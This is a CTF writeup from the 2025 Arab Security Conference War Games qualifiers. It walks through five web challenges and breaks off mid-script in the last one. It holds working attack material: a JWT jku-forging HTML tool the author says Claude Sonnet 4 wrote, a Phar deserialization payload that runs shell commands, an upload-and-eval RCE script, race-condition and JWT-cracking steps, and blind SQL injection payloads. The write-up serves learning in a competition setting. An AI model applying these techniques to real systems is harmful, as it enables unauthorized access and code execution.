---
title:  "Arab Security Conference War Games 2025 Quals CTF Writeup"
description: Web challenge from ASCWG CTF.
image: 
  path: /assets/img/blog/attachments-certay/98412db5-a8b3-467e-aaaf-f3f6f8cbfd40.png
tags: [ctf, web, sql_injection, Race_Condition, Insecure_Deserialization, JWT, RCE, PHP, Phar]
date:   2025-07-15 13:49:56 +0300
categories: [CTFs]
---

# Arab Security Conference Quals CTF Writeup - Team `4ay 5amseena`

I was competing in the Arab Security Conference CTF qualifiers with my team `4ay 5amseena` and managed to snag 4th place out of 434 teams - not too shabby!

Me (logan0x) and @aelmo (best teammate ever.) crushed 5 out of 7 challenges, so here's my writeup for the ones we solved.

Quick heads up: this writeup might be a bit rough around the edges with missing images and stuff because the organizers shut down the challenges pretty quickly after the competition ended. I hate writing writeups while the CTF is still running, so this is more of a brain dump of my thought process and solving steps. I'll share any exploits I whipped up during the competition too.

**disclaimer: These solves were a team effort between me (logan0x) and @aelmo. Not all exploits are mine, not all are aelmo's - we worked together on these challenges. When I say "I" in the writeups, it's just for ease of writing, not because I personally did every step.**

## Redirect Havoc

> **WE GOT FIRST BLOOD ON THIS ONE HAHA**

![alt text](<../assets/img/blog/attachments_ASCWG/Screenshot 2025-08-01 212352 1.png>)

### The Challenge Overview

This was a straightforward web app written in Python. The app had a simple login page and an endpoint to view files (including the flag) stored on MinIO. The key insight was that the app was running in debug mode, which meant any errors would leak sensitive information - and boy, did we get lucky with what it leaked!

![alt text](<../assets/img/blog/attachments_ASCWG/Screenshot 2025-08-01 214543.png>)

### The Discovery Process

The debug mode was our golden ticket. When errors occurred, the app would spill its guts, revealing:

- The JWT secret key (jackpot!)
- Debug messages indicating a `jku` claim was being used in the JWT

So now I had the secret key, but I still needed to craft a proper JWT. The tricky part? I had no clue about the App's JWT claims structure - just knew about the `jku` header. Seemed like a nightmare, right? But those beautiful error messages became my best friend, guiding me to craft the perfect token.

### Trial and Error (Emphasis on Error)

Here's how my debugging journey unfolded:

**First attempt**: I pointed the `jku` header to my webhook and fired off a request. The app complained it couldn't visit the link, also my webhook never got hit. My gut told me the app was probably configured to only accept `jku` hosts that matched the app's own domain. When I tested this theory, the error message changed - progress!

**The open redirect hunt**: Now I needed to trick the app into fetching the `jku` from my webhook. Time to find an open redirect vulnerability! I fuzzed around and found `/redirect?url=` - honestly, that was almost too easy haha.

**Second attempt**: With the open redirect in play, my webhook finally got a request! But now the app was whining about not finding the public key. Let me break down what's happening with `jku` for anyone following along:

The `jku` (JWK Set URL) header tells the JWT verifier where to fetch the public keys needed for signature verification. The app uses the public key to verify the JWT signature, while I need the corresponding private key to sign my crafted JWT.

**The key generation dance**: I had to set up my webhook to serve a proper JWK Set containing the public key, while using the corresponding private key to sign my JWT. 

**Final hurdle**:
![[Screenshot 2025-08-01 214530.png]]
I got the JWT working and got a pseudo login hahaha , but I wasn't admin yet! Turns out I was using a `username` claim with the value "admin", but the app actually expected a `user` claim with the value "admin". Complete guess work, but hey, it worked! Finally grabbed that flag and secured first blood.

### The Claude Surprise

After figuring all this out, I decided to explain the whole scenario to Claude Sonnet 4, expecting maybe a simple exploit script. Instead, this absolute madman didn't just write an exploit - he built a complete, full-featured tool for exploiting these kinds of JWT scenarios! **The guy's a monster when it comes to overengineering solutions.**

### The Exploit Tool

Check out this beast of an HTML file Claude generated (first time I've seen an exploit.html that wasn't for XSS, right? hahah):

Exploit.html :
```html
<!DOCTYPE html>

<html lang="en">

<head>

    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>JWKS Generator & JWT Signer</title>

    <style>

        body {

            font-family: 'Courier New', monospace;

            background: linear-gradient(135deg, #667eea, #764ba2);

            color: #fff;

            margin: 0;

            padding: 20px;

            min-height: 100vh;

        }

        .container {

            max-width: 1200px;

            margin: 0 auto;

            background: rgba(0, 0, 0, 0.8);

            border-radius: 15px;

            padding: 30px;

            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);

        }

        h1 {

            text-align: center;

            color: #4ecdc4;

            text-shadow: 0 0 20px rgba(78, 205, 196, 0.5);

            margin-bottom: 30px;

        }

        .section {

            margin: 20px 0;

            padding: 20px;

            background: rgba(255, 255, 255, 0.1);

            border-radius: 10px;

            border-left: 4px solid #4ecdc4;

        }

        button {

            background: linear-gradient(45deg, #4ecdc4, #44a08d);

            color: #000;

            border: none;

            padding: 12px 25px;

            border-radius: 8px;

            cursor: pointer;

            font-weight: bold;

            margin: 10px 5px;

            transition: all 0.3s;

        }

        button:hover {

            transform: translateY(-2px);

            box-shadow: 0 8px 20px rgba(78, 205, 196, 0.4);

        }

        .output {

            background: rgba(0, 0, 0, 0.6);

            padding: 15px;

            border-radius: 8px;

            word-break: break-all;

            margin-top: 10px;

            border: 1px solid #333;

            font-family: monospace;

            font-size: 12px;

            max-height: 300px;

            overflow-y: auto;

        }

        .success { color: #4ecdc4; }

        .warning { color: #ffa726; }

        .error { color: #ef5350; }

        textarea {

            width: 100%;

            height: 150px;

            background: rgba(0, 0, 0, 0.5);

            border: 1px solid #4ecdc4;

            border-radius: 5px;

            color: #fff;

            font-family: 'Courier New', monospace;

            padding: 10px;

            box-sizing: border-box;

            resize: vertical;

        }

        input {

            width: 100%;

            padding: 10px;

            background: rgba(0, 0, 0, 0.5);

            border: 1px solid #4ecdc4;

            border-radius: 5px;

            color: #fff;

            font-family: 'Courier New', monospace;

            box-sizing: border-box;

        }

    </style>

</head>

<body>

    <div class="container">

        <h1>🔐 JWKS Generator & JWT Signer</h1>

        <div class="section">

            <h3>Step 1: Generate RSA Key Pair</h3>

            <button onclick="generateRSAKeyPair()">🔑 Generate RSA Keys</button>

            <div id="keyOutput" class="output">Click "Generate RSA Keys" to create a key pair</div>

        </div>

  

        <div class="section">

            <h3>Step 2: Generate JWKS (Host this on your webhook)</h3>

            <button onclick="generateJWKS()">📋 Generate JWKS</button>

            <button onclick="copyJWKS()">📥 Copy JWKS</button>

            <div id="jwksOutput" class="output">Generate RSA keys first</div>

        </div>

  

        <div class="section">

            <h3>Step 3: Create JWT with RSA Signature</h3>

            <label>JWT Header:</label>

            <textarea id="jwtHeader">{

  "alg": "RS256",

  "typ": "JWT",

  "jku": "http://34.9.3.251:9001/redirect/?url=https://webhook.site/9667e68a-a68a-47a6-89e3-49b87606ffc3/jwks.json"

}</textarea>

            <label>JWT Payload:</label>

            <textarea id="jwtPayload">{

  "sub": "admin",

  "username": "admin",

  "iat": 1722535662,

  "exp": 1722539262

}</textarea>

            <button onclick="updateTimestamps()">🕒 Update Timestamps</button>

            <button onclick="generateJWT()">🚀 Generate JWT</button>

            <div id="jwtOutput" class="output">Generate RSA keys and then create JWT</div>

        </div>

  

        <div class="section warning">

            <h3>⚠️ Instructions</h3>

            <ol>

                <li><strong>Generate RSA Keys:</strong> Creates public/private key pair</li>

                <li><strong>Copy JWKS:</strong> Host this JSON on your webhook endpoint</li>

                <li><strong>Generate JWT:</strong> Creates properly signed JWT with RS256</li>

                <li><strong>Test:</strong> Use the JWT as auth cookie in your requests</li>

            </ol>

        </div>

    </div>

  

    <script>

        let privateKey = null;

        let publicKey = null;

        let jwk = null;

  

        async function generateRSAKeyPair() {

            try {

                const keyPair = await crypto.subtle.generateKey(

                    {

                        name: "RSASSA-PKCS1-v1_5",

                        modulusLength: 2048,

                        publicExponent: new Uint8Array([1, 0, 1]),

                        hash: "SHA-256"

                    },

                    true,

                    ["sign", "verify"]

                );

  

                privateKey = keyPair.privateKey;

                publicKey = keyPair.publicKey;

  

                // Export public key as JWK

                jwk = await crypto.subtle.exportKey("jwk", publicKey);

                jwk.kid = "1";

                jwk.alg = "RS256";

                jwk.use = "sig";

  

                document.getElementById('keyOutput').innerHTML = `

                    <div class="success">✅ RSA Key Pair Generated Successfully!</div>

                    <div><strong>Key Length:</strong> 2048 bits</div>

                    <div><strong>Algorithm:</strong> RS256 (RSA with SHA-256)</div>

                    <div><strong>Key ID:</strong> 1</div>

                `;

            } catch (error) {

                document.getElementById('keyOutput').innerHTML = `

                    <div class="error">❌ Error: ${error.message}</div>

                `;

            }

        }

  

        function generateJWKS() {

            if (!jwk) {

                alert('Generate RSA keys first!');

                return;

            }

  

            const jwks = {

                keys: [jwk]

            };

  

            document.getElementById('jwksOutput').innerHTML = `

                <div class="success"><strong>JWKS JSON (Host this on your webhook):</strong></div>

                <pre>${JSON.stringify(jwks, null, 2)}</pre>

            `;

        }

  

        function copyJWKS() {

            if (!jwk) {

                alert('Generate RSA keys first!');

                return;

            }

  

            const jwks = {

                keys: [jwk]

            };

  

            navigator.clipboard.writeText(JSON.stringify(jwks, null, 2)).then(() => {

                alert('JWKS copied to clipboard! Paste this as the response body on your webhook.');

            });

        }

  

        function updateTimestamps() {

            const now = Math.floor(Date.now() / 1000);

            const exp = now + 3600; // 1 hour from now

            const payload = JSON.parse(document.getElementById('jwtPayload').value);

            payload.iat = now;

            payload.exp = exp;

            document.getElementById('jwtPayload').value = JSON.stringify(payload, null, 2);

        }

  

        function base64urlEncode(arrayBuffer) {

            const bytes = new Uint8Array(arrayBuffer);

            let binary = '';

            for (let i = 0; i < bytes.byteLength; i++) {

                binary += String.fromCharCode(bytes[i]);

            }

            return btoa(binary)

                .replace(/\+/g, '-')

                .replace(/\//g, '_')

                .replace(/=/g, '');

        }

  

        function base64urlEncodeString(str) {

            return btoa(str)

                .replace(/\+/g, '-')

                .replace(/\//g, '_')

                .replace(/=/g, '');

        }

  

        async function generateJWT() {

            if (!privateKey) {

                alert('Generate RSA keys first!');

                return;

            }

  

            try {

                const header = JSON.parse(document.getElementById('jwtHeader').value);

                const payload = JSON.parse(document.getElementById('jwtPayload').value);

  

                const encodedHeader = base64urlEncodeString(JSON.stringify(header));

                const encodedPayload = base64urlEncodeString(JSON.stringify(payload));

                const data = encodedHeader + '.' + encodedPayload;

                const encoder = new TextEncoder();

                const dataBuffer = encoder.encode(data);

  

                const signature = await crypto.subtle.sign(

                    "RSASSA-PKCS1-v1_5",

                    privateKey,

                    dataBuffer

                );

  

                const encodedSignature = base64urlEncode(signature);

                const jwt = data + '.' + encodedSignature;

  

                document.getElementById('jwtOutput').innerHTML = `

                    <div class="success"><strong>✅ JWT Generated Successfully!</strong></div>

                    <div><strong>Algorithm:</strong> RS256</div>

                    <div><strong>JWT Token:</strong></div>

                    <div style="color: #4ecdc4; word-break: break-all; margin: 10px 0; padding: 10px; background: rgba(0,0,0,0.3); border-radius: 5px;">

                        ${jwt}

                    </div>

                    <div><strong>Usage:</strong> Set this as your 'auth' cookie value</div>

                `;

  

            } catch (error) {

                document.getElementById('jwtOutput').innerHTML = `

                    <div class="error">❌ Error: ${error.message}</div>

                `;

            }

        }

  

        // Auto-update timestamps on page load

        window.onload = function() {

            updateTimestamps();

        };

    </script>

</body>

</html>
```

![alt text](<../assets/img/blog/attachments_ASCWG/Pasted image 20250803062052.png>)

this MF wrote a pretty tool.

## SadCoder



> **We got first blood on this one too!**
### The Challenge
Simple whitebox web app: upload a report, preview it. They gave us the source code and php.ini.

it was a simple direct Phar Deserialization Attack

relevant source code :
```php
<?php

error_reporting(0);

ini_set('display_errors', 0);

  

class Logger {

    public static function log($user, $action) {

        $file = __DIR__ . '/logs/audit.log';

        file_put_contents($file, date("[Y-m-d H:i:s] ") . "$user: $action\n", FILE_APPEND);

    }

}

  

class Analytics {

    public function generateStats($file) {

        echo "<div class='info'>Analyzing report: " . htmlspecialchars($file) . "</div>";

    }

}

  

class SystemTask {

    private $task;

    public function __construct($task) {

        $this->task = $task;

    }

    public function __wakeup() {

        @system($this->task);

    }

}

  

if (isset($_GET['cmd'])){

  $_GET['cmd'] = "";

  system($_GET['cmd']);

}

  

$uploadDir = __DIR__ . '/uploads/';

if (!file_exists($uploadDir)) {

    mkdir($uploadDir, 0777, true);

}

  

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['report_file'])) {

    $allowedTypes = ['application/pdf', 'application/octet-stream'];

    $filename = basename($_FILES['report_file']['name']);

    $targetPath = $uploadDir . $filename;

    $mime = mime_content_type($_FILES['report_file']['tmp_name']);

    $extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));

    $blacklistedExtensions = ['php','php4','php5','php7','php8','phtml','phps','ini','htaccess','zip','tar','7z','phar'];

  

    if (preg_match('/php\d*$/i', $extension) || in_array($extension, $blacklistedExtensions)) {

        echo "<div class='error'>Upload failed: file extension is not allowed.</div>";

    } elseif (in_array($mime, $allowedTypes)) {

        if (move_uploaded_file($_FILES['report_file']['tmp_name'], $targetPath)) {

            Logger::log("visitor", "Uploaded file: " . $filename);

            echo "<div class='success'>Upload successful: " . htmlspecialchars($filename) . "</div>";

        } else {

            echo "<div class='error'>Upload failed.</div>";

        }

    } else {

        echo "<div class='error'>Unsupported file type.</div>";

    }

}

  

function previewReport($file) {

    $safeFile = basename($file);

    $fullPath = __DIR__ . "/uploads/" . $safeFile;

  

    if (!file_exists($fullPath)) {

        echo "<div class='error'>File not found.</div>";

        return;

    }

  

    $extension = strtolower(pathinfo($safeFile, PATHINFO_EXTENSION));

  

    if ($extension === 'pdf') {

        echo "<h3>Previewing PDF:</h3>";

        echo "<iframe src='uploads/" . htmlspecialchars($safeFile) . "' width='100%' height='500px'></iframe>";

    } elseif ($extension !== 'pdf') {

        try {

            $explor = new Phar($fullPath);

            $meta = $explor->getMetadata();

            $analytics = new Analytics();

            $analytics->generateStats($safeFile);

            if (isset($meta['data'])) echo $meta['data'];

            $content = @file_get_contents($fullPath);

            echo "<pre>" . htmlspecialchars($content ?: "No test.txt inside archive.") . "</pre>";

        } catch (Exception $e) {

            echo "<div class='error'>Error reading file: " . htmlspecialchars($e->getMessage()) . "</div>";

        }

    } else {

        echo "<div class='error'>Unsupported file format.</div>";

    }

}

  

echo '<!DOCTYPE html><html><head><title>Report Upload Portal</title>';

echo '<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">';

echo '<style>

    body {

        font-family: "Inter", sans-serif;

        background-color: #f1f5f9;

        color: #1e293b;

        padding: 40px;

    }

    h2, h3 {

        color: #0f172a;

    }

    .container {

        background: #ffffff;

        padding: 30px;

        border-radius: 10px;

        box-shadow: 0 5px 15px rgba(0,0,0,0.05);

        max-width: 700px;

        margin: 0 auto;

    }

    input[type="file"], input[type="text"] {

        padding: 10px;

        border: 1px solid #cbd5e1;

        border-radius: 6px;

        width: 100%;

        margin-bottom: 15px;

    }

    input[type="submit"] {

        background-color: #2563eb;

        color: white;

        padding: 10px 20px;

        border: none;

        border-radius: 6px;

        cursor: pointer;

        font-weight: bold;

    }

    input[type="submit"]:hover {

        background-color: #1d4ed8;

    }

    .success { background: #dcfce7; padding: 10px; color: #15803d; margin: 15px 0; border-left: 4px solid #22c55e; }

    .error { background: #fee2e2; padding: 10px; color: #b91c1c; margin: 15px 0; border-left: 4px solid #ef4444; }

    .info { background: #e0f2fe; padding: 10px; color: #0369a1; margin: 15px 0; border-left: 4px solid #0ea5e9; }

    pre {

        background: #f3f4f6;

        padding: 15px;

        border-radius: 8px;

        overflow-x: auto;

    }

</style>';

echo '</head><body>';

echo '<div class="container">';

echo '<h2>📤 Upload Monthly Report (.pdf)</h2>';

echo '<form method="POST" enctype="multipart/form-data">';

echo '<input type="file" name="report_file" accept=".pdf" required>';

echo '<input type="submit" value="Upload Report">';

echo '</form>';

echo '<h3>🔎 Preview a Report</h3>';

echo '<form method="GET">';

echo '<input type="text" name="report" placeholder="example.pdf" required>';

echo '<input type="submit" value="Preview">';

echo '</form>';

echo '</div>';

  

if (isset($_GET['report'])) {

    echo '<div class="container" style="margin-top:30px">';

    previewReport($_GET['report']);

    echo '</div>';

}

echo '</body></html>';

?>
```
### Code Review - The Smoking Gun
First thing I spotted in `index.php`:

```php
class SystemTask {
    private $task;
    public function __construct($task) {
        $this->task = $task;
    }
    public function __wakeup() {
        @system($this->task);  // RCE via magic method!
    }
}
```

A `__wakeup()` magic method that executes system commands? That's screaming object injection vulnerability.

Then I hit the preview function:
```php
function previewReport($file) {
    // ...
    if ($extension !== 'pdf') {
        $explor = new Phar($fullPath);  // User-controlled Phar creation!
        $meta = $explor->getMetadata();  // Automatic deserialization
        // ...
    }
}
```

**Lightbulb moment**: The `previewReport()` function calls `new Phar($fullPath)` on our uploaded file. This is a filesystem operation that automatically triggers deserialization of the Phar metadata, which will call our `SystemTask::__wakeup()` method!

### The Attack Vector - Phar Deserialization
Here's the crucial part I need to explain properly: **any filesystem function that accesses a Phar file will automatically deserialize the metadata stored in that Phar file**. This happens by design in PHP.

The `new Phar($fullPath)` call is a filesystem operation that reads our uploaded Phar file. The moment PHP touches that file, it automatically unserializes whatever object we stored in the Phar's metadata section. If that object has a `__wakeup()` magic method, PHP calls it immediately during deserialization.

### The Attack
1. **Craft malicious Phar**:
```php
<?php
class SystemTask {
    private $task;
    public function __construct($task) {
        $this->task = $task;
    }
}

$phar = new Phar('exploit.phar');
$phar->addFromString('test.txt', 'test content');
$phar->setMetadata(new SystemTask('cat /tmp/flag.php'));
$phar->setStub('<?php __HALT_COMPILER(); ?>');
?>
```

2. **Upload** the Phar file as `exploit.phar.txt` - bypassed the extension blacklist since it ends with `.txt`, but it's still a valid Phar file internally!
> i will explain why the double extensions works later.
3. **Trigger** with `/?report=exploit.phar`

4. **Boom** - `new Phar()` processes the file and PHP automatically deserializes the Phar metadata (regardless of the filename!), our `SystemTask::__wakeup()` gets called, command executes, flag captured!


**But why the double extension trick works ?**
Honestly, when I was solving the challenge, it was obvious to me what the idea behind it was. I knew exactly that it was about a Phar Deserialization Attack, as I had read about it before and even faced it in a previous CTF. So crafting the payload was easy.

The only problem I encountered was the extension bypass.

In that CTF, I simply gave the double extension trick a try, I didn't really think too hard about it. Double extensions are a known technique. But after the CTF, I started wondering: why does it actually work? That question stuck with me.

So I did something simple. I went to review the Phar source code xD

I basically started by building the challenge on my localhost, then began experimenting with it. At first, I tried uploading the file **without any extension**, actually thinking it might work based on what I knew, PHP archives (Phars) don't necessarily require a specific extension. But… yeah. i got this error :
```txt
Error reading file: Cannot create phar '/var/www/html/uploads/x', file extension (or combination) not recognised or the directory does not exist
```
![alt text](<../assets/img/blog/attachments_ASCWG/Pasted image 20250804124818.png>)

So I searched for that error message in https://github.com/php/php-src/blob/master/ext/phar/phar.c

and i found it at :
https://github.com/php/php-src/blob/master/ext/phar/phar.c#L1342
```php
	if (FAILURE == phar_detect_phar_fname_ext(fname, fname_len, &ext_str, &ext_len, !is_data, 1, 1)) {
		if (error) {
			if (ext_len == -2) {
				spprintf(error, 0, "Cannot create a phar archive from a URL like \"%s\". Phar objects can only be created from local files", fname);
			} else {
				spprintf(error, 0, "Cannot create phar '%s', file extension (or combination) not recognised or the directory does not exist", fname);
			}
		}
		return FAILURE;
	}

```

So I went to analyze `phar_detect_phar_fname_ext()`
and here's what I found :
https://github.com/php/php-src/blob/master/ext/phar/phar.c#L1977

basically This is the main extension detection function that:

- Parses the filename to find file extensions (looks for dots)
- Handles cache lookups for already-loaded Phar files
- Extracts the extension part and calls validation
- Returns SUCCESS/FAILURE based on whether a valid Phar extension is found
and here is the call flow i got from this function 
```
phar_detect_phar_fname_ext() 
	↓ (finds extension) 
	↓ (extracts ext_str and ext_len) 
phar_check_str() 
	↓ (validates .phar requirement) 
phar_analyze_path() 
	↓ (checks filesystem)
```

The key insight is that **`phar_detect_phar_fname_ext` must find at least one dot** in the filename to proceed. Without a dot, it never even calls `phar_check_str` - it fails immediately at the extension detection stage.

so that's why our uploading to a file name with no dots or extensions at all did not work.

let's go in more details about how the function works.
let's take the working bypass (double extension) as an example :

###### **Step 1: Entry Point - `phar_detect_phar_fname_ext`**
For filename `x.phar.txt` (length = 10):
```C
### Step 1: Entry Point - `phar_detect_phar_fname_ext`

For filename `x.phar.txt` (length = 10):
```

**Initial checks:**

- `filename_len <= 1` → FALSE (10 > 1), continues
- `pos = memchr(filename, '/', filename_len)` → NULL (no '/' in "x.phar.txt")

**Cache lookup section:** The function first checks if the file is already in cache (`phar_fname_map` or `cached_phars`). For a new file `x.phar.txt`, this would likely return nothing, so we proceed to the extension detection logic.

###### **Step 2: Extension Detection Logic**
```C
pos = memchr(filename + 1, '.', filename_len);
```
**For `x.phar.txt`:**

- Searches for '.' starting from position 1 (skipping 'x')
- Finds first '.' at position 1 (the '.' in `.phar`)
- `pos` points to the first '.' in `.phar.txt`

```C
next_extension:
if (!pos) {
    return FAILURE;
}

while (pos != filename && (*(pos - 1) == '/' || *(pos - 1) == '\0')) {
    pos = memchr(pos + 1, '.', filename_len - (pos - filename) - 1);
    if (!pos) {
        return FAILURE;
    }
}
```

**Analysis:**
- `if (!pos) {return FAILURE;}` if no dots , just returns failure tha's why our previous bypass did not work
- `pos != filename` → TRUE (pos points to '.' after 'x')
- `*(pos - 1) == '/'` → FALSE ('x' != '/')
- `*(pos - 1) == '\0'` → FALSE ('x' != '\0')
- Loop condition is FALSE, so we don't enter the while loop

```C
slash = memchr(pos, '/', filename_len - (pos - filename));
```
**For `x.phar.txt`:**

- Searches for '/' from the '.' position onward
- `slash = NULL` (no '/' found in `.phar.txt`)

###### Step 3: No Directory Separator Path
```c
if (!slash) {
    /* this is a url like "phar://blah.phar" with no directory */
    *ext_str = pos;
    *ext_len = strlen(pos);

    /* file extension must contain "phar" */
    return phar_check_str(filename, *ext_str, *ext_len, executable, for_create);
}
```

**For `x.phar.txt`:**

- `slash` is NULL, so we enter this branch
- `*ext_str = pos` → points to `.phar.txt`
- `*ext_len = strlen(pos)` → 9 (length of `.phar.txt`)
- Calls `phar_check_str(filename, ".phar.txt", 9, executable, for_create)` *so if the filename was x.txt.txt it will not work ! and will return the same previous error message*
###### Step 4: `phar_check_str` Analysis

Now we call `phar_check_str` with:

- `fname = "x.phar.txt"`
- `ext_str = ".phar.txt"`
- `ext_len = 9`
- `executable = ?` (depends on calling context)
- `for_create = ?` (depends on calling context)
**Length check:**
```C
if (ext_len >= 50) { return FAILURE; }
```

9 < 50, so continues.

**If `executable == 1`:**
```c
pos = strstr(ext_str, ".phar");
```
- Finds `.phar` at the beginning of `.phar.txt`
- `pos` points to `.phar`

Coming checks are so important: 
```C
if (!pos
    || (pos != ext_str && (*(pos - 1) == '/'))
    || (ext_len - (pos - ext_str)) < 5
    || !(pos += 5)
    || !(*pos == '\0' || *pos == '/' || *pos == '.')) {
    return FAILURE;
}
```

**Condition analysis:**

- `!pos` → FALSE (pos is not NULL)
- `(pos != ext_str && (*(pos - 1) == '/'))` → FALSE (pos == ext_str)
- `(ext_len - (pos - ext_str)) < 5` → FALSE (9 - 0 = 9, which is >= 5)
- `!(pos += 5)` → FALSE (pos advances to point to `.txt`, which is not NULL)
- `!(*pos == '\0' || *pos == '/' || *pos == '.')` → FALSE (*pos is '.', so condition is TRUE)*
**Result: All conditions are FALSE, so we DON'T return FAILURE**
```c
return phar_analyze_path(fname, ext_str, ext_len, for_create);
```


based on the previous analysis do you think `payload.phar.` will work ?

I hope that helps you understand why double extension works.

## Final Shutdown

> the challenge description was explicitly says that you need to shutdown a car to the flag.

*i will say the story , there is no image to help.*
So I fire up this app and it's pretty basic - just login and register functions staring at me. I create an account, register, and get handed this JWT token. After decoding it, here's what I'm looking at:
```
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "userId": "0000000-1111-2222-3333-444444444444",
  "vinCode": "5YJXCAE46GF008789",
  "model": "Model X",
  "iat": 1754265251,
  "exp": 1754268851
}
```
Pretty normal JWT with my user info and some car details. Nothing too exciting yet.

Time for some fuzzing because what else are you gonna do? I start throwing random endpoints at it and hit two interesting ones: `/admin` (which gave me a nice 403 access denied) and `/car`. The `/car` endpoint was way more cooperative and leaked some juicy info about cars in the system like `user_id, latitude, longitude, VIN, and car status`.


The challenge description kept mentioning something about "shutting down a running car" so I paid attention to the car statuses. Out of all the cars returned by `/car`, only ONE had status "running" while the rest were sitting in other status. That running car was definitely special somehow.
Also there was an endpoint vulnerable to IDOR that leaks some basic info of the user by using the `user_id` and using that i get to know that the user that is associated with the running car is admin !

I figured the key was probably the `user_id` associated with that running car. After some time i did not found anything has meaning so i just decided it's time to crack some JWTs! Fired up my trusty rockyou wordlist against the JWT secret and boom cracked it. With the secret in hand, I forged myself a new JWT using the running car's `user_id`.

Hit `/admin` again with my shiny new token and  I'm not getting 403s anymore! Three new endpoints appeared: `/admin-cupe/buy`, `/admin-cupe/refund`, and `/admin-cupe/shutdown`. The shutdown one was obviously my target, but there was a problem, shutting down a car costs 15 cubes and I only had 5.
Classic broke hacker situation haha. But hey, I had a buy endpoint and a refund endpoint, so maybe I could work some magic?

Turns out `/admin-cupe/buy` was vulnerable to a beautiful race condition. I fired off multiple simultaneous buy requests for items whose total cost exceeded my measly 5 cubes. The app wasn't handling concurrent transactions properly, so all my requests checked my balance at the same time, saw I had "enough" cubes, and let every single purchase go through.

Essentially I was buying stuff with money that didn't exist. After exploiting the race condition to rack up purchases I couldn't actually afford, I hit `/admin-cupe/refund` to refund everything. The refunds gave me back way more cubes than I originally had since I'd "bought" items with imaginary money.

With my freshly printed 15 cubes, I finally hit `/admin-cupe/shutdown` got rewarded with the flag. The whole attack chain was pretty satisfying fuzz for endpoints, crack JWT secret with rockyou, forge admin token with the special user_id, exploit race condition to print money, then shutdown the car for the win.


## TimeBomb

So I open up this app and it's got the usual register and login setup. After logging in, I can submit tickets and view tickets. My first thought was XSS challenge territory but nope, no bot running in the background to steal cookies.

I honestly got stuck here way longer than I should have because the app was throwing errors everywhere and I kept thinking these errors had some deep hidden meaning. Spent hours trying to decode error messages like they were some cryptographic puzzle when really I was just overthinking everything.

After burning through several hours being way too clever for my own good, I decided to go back to basics and fuzz some endpoints. Found `reset.php`, `admin.php`, and `flag.php`. The admin one just said "only for admins" and the others were empty, but reset.php looked suspicious.


Started fuzzing query parameters on reset.php and found it takes a `token` parameter. So I sent `/reset.php?token=lol` and it just handed me the admin password: `StR0ngAdM!nP@ssw0rd`. The token value didn't matter at all - you just need the parameter to exist. Pretty solid security right there.

With the admin password, I logged in and got redirected to `/admin` with two new endpoints: `upload_plugin` and `run_plugin`. The upload one was picky about MIME types - only accepted `image/png`. I also fuzzed for extensions and found that `png`, `jpg`, and `inc` are accepted. When you upload something, it returns a hash + extension that you could use with `run_plugin`.

I uploaded a test image and tried to run it using `run_plugin`, but got this error:

request:
```
GET /run_plugin.php?name=x.png HTTP/1.1
Host: 34.9.3.251:8887
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
User-Agent: python-httpx/0.28.1
Cookie: PHPSESSID=a8ad3689f52238c44e237cb5dce1381b

```

response:
```
Warning: readfile(/var/www/html/uploads/plugins/232456fj45034.png): Failed to open stream: No such file or directory
```

Two things stood out: the app uses `readfile()` to process files, and where the hell did my uploaded file go? It just vanished into thin air. Also noticed that there must be another operation happening after `readfile()` since readfile alone doesn't "run" anything.

That's when the challenge name "TimeBomb" finally made sense.  So I had this idea what if I could call `run_plugin` fast enough before the file disappears?

Wrote a quick async script to upload and immediately run the file, and boom! The error message changed, showing that the file content gets read by `readfile()` and then passed to `eval()`. Classic PHP RCE setup right there.

Now I needed a payload. Tried various functions to read the flag but a bunch were filtered. Then I realized  why not just use `readfile()` since that's what the app is already using internally? Sometimes the simplest solution is staring you right in the face.

```python
import httpx
import asyncio
import re

c = httpx.AsyncClient(base_url="http://34.9.3.251:8887", proxy="http://localhost:8081")

async def login():
    r = await c.post(
        "/login.php", data={"email": "admin", "password": "StR0ngAdM!nP@ssw0rd"}
    )
    assert r.status_code == 302, "login failed"

async def get_flag():
    payload = b"<?php readfile('flag.php');"
    r = await c.post(
        "/plugin_upload.php",
        files={"file": ("flag.inc", payload, "image/png")},
    )
    if m := re.search("Uploaded as: (.+)", r.text):
        filename = m.group(1).strip()
        print(f"[+] Uploaded as: {filename}")
        r = await c.get(f"/run_plugin.php?name={filename}")
        print("FLAG CONTENT:")
        print("="*50)
        print(r.text)
        print("="*50)

async def main():
    await login()
    await get_flag()

asyncio.run(main())
```

## Unseen Path to secret

So I land on this "Site Under Construction" page
![alt text](<../assets/img/blog/attachments_ASCWG/Screenshot 2025-08-01 180956.png>)
and it's exactly as boring as it sounds. But down at the bottom there's this little "Powered by Github ..." also the "DevPortal" thing  caught my eye. , so naturally I tried `/.git/` first.

I Got a 403 Forbidden when i tried it, but that doesn't mean game over.
i just started dirsearch with recursive option to try to get files under `/.git/` maybe they just block the directory listing but not the actual files inside. So I tried `/.git/config` and `/.git/HEAD` and fles started downloading!

Fired up git-dumper with `git-dumper http://34.18.12.84:8086/.git/ repo` and pulled down all the files. 

 Looking at git history to see what secrets developers accidentally committed. Did a `git log` and found the commits, but one stood out: "Delete Secrets!" - yeah, that's not suspicious at all lol.

Checked out the commit right before that one with `git checkout 0a6893d` and found a file called `.config.php.swp` sitting there with some juicy credentials. Classic case of deleting secrets from the current version but forgetting they're still in git history.

Used those creds on the login page and suddenly I'm in the admin panel. There's this "Check User (Test)" functionality that lets you check if a user is active or not. 
Started testing the user check function SQL injection but they had filters blocking symbols like `;`, backticks, `>`, `<`, `\=`, and `$`. Pretty comprehensive filtering actually.
But then I tried `admin' AND LENGTH(username) BETWEEN 5 AND 10 --` and got "User is active" - that's a true response! 
Tried `admin' AND LENGTH(username) BETWEEN 1 AND 2 --` and got "User not found" - false response. Bingo, we've got blind SQL injection working even with the symbol filtering.

The three possible responses were:

- "User is active" (true)
- "User not found" (false)
- "error in query" (malformed SQL)

Perfect setup for boolean-based blind SQL injection. Time to write some scripts and extract everything character by character.

First script was for dumping table names from `sqlite_master`:

```python
import requests

url = "http://34.18.12.84:8086/admin.php?action=check"
cookies = {"PHPSESSID": "d72b2109670db5942d4eea110b92bd35"}

def is_char(c, offset):
